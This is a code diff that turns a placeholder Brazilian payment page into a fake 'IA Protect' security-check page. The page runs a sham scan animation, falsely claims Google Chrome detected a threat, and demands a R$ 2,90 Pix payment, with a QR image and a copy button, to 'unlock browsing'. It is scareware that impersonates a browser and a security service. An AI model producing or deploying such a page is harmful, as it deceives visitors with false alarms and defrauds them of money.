@@ -1,11 +1,100 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Página QRPix</title>
-  </head>
-  <body>
-    <h1>🚀 Página de pagamento ativa!</h1>
-    <p>Estamos quase lá...</p>
-  </body>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IA Protect - Verificação</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0e0e0e;
+      color: #fff;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .scanner {
+      animation: pulse 1.5s infinite;
+      border: 4px solid #00ff99;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      margin-bottom: 20px;
+    }
+
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+        opacity: 0.8;
+      }
+      50% {
+        transform: scale(1.2);
+        opacity: 1;
+      }
+      100% {
+        transform: scale(1);
+        opacity: 0.8;
+      }
+    }
+
+    .loading, .main-content {
+      display: none;
+    }
+
+    .main-content img {
+      width: 200px;
+      margin: 20px 0;
+    }
+
+    button {
+      background: #00ff99;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="loading" id="loading">
+    <div class="scanner"></div>
+    <h2>Varredura em andamento...</h2>
+    <p>IA Protect está analisando esta conexão.</p>
+  </div>
+
+  <div class="main-content" id="main">
+    <h1>O Google Chrome detectou uma possível ameaça invisível nesta página</h1>
+    <p>Para garantir sua segurança, o sistema <strong>IA Protect</strong> ativou uma camada de proteção imediata.</p>
+    <p><strong>⚠️ Confirme sua identidade via Pix (R$ 2,90) para desbloquear a navegação.</strong></p>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/QR_Code_Example.svg" alt="QR Pix"/>
+    <p><strong>Código Pix:</strong></p>
+    <p id="pix-code">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey52040000530398654039.905802BR5921IA Protect Segurança6014São Paulo-SP62070503***6304ABCD</p>
+    <button onclick="copyPix()">Copiar código Pix</button>
+  </div>
+
+  <script>
+    // Aguarda 4 segundos simulando varredura
+    setTimeout(() => {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("main").style.display = "block";
+    }, 4000);
+
+    function copyPix() {
+      const text = document.getElementById("pix-code").innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Código Pix copiado!");
+      });
+    }
+
+    // Mostrar loading ao iniciar
+    document.getElementById("loading").style.display = "block";
+  </script>
+</body>
 </html>
